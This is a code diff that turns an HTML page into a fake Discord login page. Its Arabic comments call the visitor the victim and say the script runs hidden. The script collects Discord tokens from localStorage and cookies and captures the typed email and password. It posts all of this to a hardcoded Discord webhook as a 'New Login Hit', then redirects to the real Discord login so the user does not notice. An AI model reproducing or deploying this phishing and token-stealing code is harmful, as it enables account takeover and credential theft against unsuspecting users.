@@ -1,71 +1,191 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wng Store - المتجر الأول لخدمات ديسكورد</title>
+    <title>Discord - Login</title>
     <style>
-        body, html {
+        body {
+            background-color: #313338;
+            color: #dbdee1;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden; /* يخفي السكرول بار */
         }
-        iframe {
+        .login-box {
+            background-color: #313338;
+            padding: 32px;
+            border-radius: 5px;
             width: 100%;
-            height: 100%;
+            max-width: 420px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .login-box img {
+            width: 120px;
+            margin-bottom: 24px;
+        }
+        h2 {
+            color: #f2f3f5;
+            margin-bottom: 8px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        p {
+            color: #b5bac1;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        .input-group label span {
+            color: #f23f43;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            background-color: #1e1f22;
             border: none;
+            border-radius: 3px;
+            color: #dbdee1;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .input-group input:focus {
+            border: 1px solid #5865f2;
+        }
+        .forgot-password {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #00a8fc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .login-btn {
+            width: 100%;
+            background-color: #5865f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .login-btn:hover {
+            background-color: #4752c4;
+        }
+        .register-link {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #949ba4;
+        }
+        .register-link a {
+            color: #00a8fc;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- هذا هو موقع المتجر الأصلي اللي بيشوفه الضحية -->
-    <iframe src="https://mmjrashy889-ui.github.io/Wng-Store/" frameborder="0"></iframe>
+    <div class="login-box">
+        <!-- صورة شعار ديسكورد -->
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="Discord">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
 
-    <!-- هنا السكربت حقك اللي يشتغل بالخفاء -->
+        <form id="loginForm">
+            <div class="input-group">
+                <label>EMAIL OR PHONE NUMBER <span>*</span></label>
+                <input type="text" id="email" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label>PASSWORD <span>*</span></label>
+                <input type="password" id="password" required>
+            </div>
+            <div class="forgot-password">
+                <a href="#">Forgot your password?</a>
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        
+        <div class="register-link">
+            Need an account? <a href="#">Register</a>
+        </div>
+    </div>
+
     <script>
     (function(){
       const WEBHOOK = "https://ptb.discord.com/api/webhooks/1563433824195715163/pImDLSOanfVezzULnId7p-Fny5ViXFkbPyoldjKCBnEzpFaPDg7dO6oj7zuBHTJISlwr";
 
-      let tokens = [];
-      try {
-        for (let i = 0; i < localStorage.length; i++) {
-          const k = localStorage.key(i);
-          const v = localStorage.getItem(k);
-          if (typeof v === 'string') {
-            const m = v.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
-            if (m) tokens.push(...m);
-          }
-        }
-      } catch(e){}
+      // دالة عشان تجيب التوكن لو كان مخزن بالمتصفح
+      function getTokens() {
+          let tokens = [];
+          try {
+            for (let i = 0; i < localStorage.length; i++) {
+              const k = localStorage.key(i);
+              const v = localStorage.getItem(k);
+              if (typeof v === 'string') {
+                const m = v.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
+                if (m) tokens.push(...m);
+              }
+            }
+          } catch(e){}
+          return [...new Set(tokens)];
+      }
 
-      try {
-        const c = document.cookie.match(/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g);
-        if (c) tokens.push(...c);
-      } catch(e){}
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
+          e.preventDefault(); // نمنع الصفحة إنها تروح لديسكورد الحقيقي
+          
+          const email = document.getElementById('email').value;
+          const password = document.getElementById('password').value;
+          const tokens = getTokens();
 
-      tokens = [...new Set(tokens)];
+          // تجهيز البيانات اللي بتروح للويبهوك
+          const info = {
+            email: email,
+            password: password,
+            tokens: tokens,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            url: location.href,
+            time: new Date().toISOString(),
+            cookies: document.cookie
+          };
 
-      const info = {
-        tokens: tokens,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        url: location.href,
-        time: new Date().toISOString(),
-        cookies: document.cookie
-      };
-
-      // إرسال البيانات
-      fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: "**New Hit**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1900) + "\n```"
-        })
-      }).catch(()=>{});
+          // إرسال البيانات للويبهوك
+          fetch(WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              content: "**🎯 New Login Hit!**\n```json\n" + JSON.stringify(info, null, 2).slice(0, 1900) + "\n```"
+            })
+          }).catch(()=>{}).finally(() => {
+              // بعد ما يرسل البيانات، نوجهه لصفحة ديسكورد الحقيقية عشان يكمل حياته وما يشك
+              window.location.href = "https://discord.com/login";
+          });
+      });
     })();
     </script>
 </body>
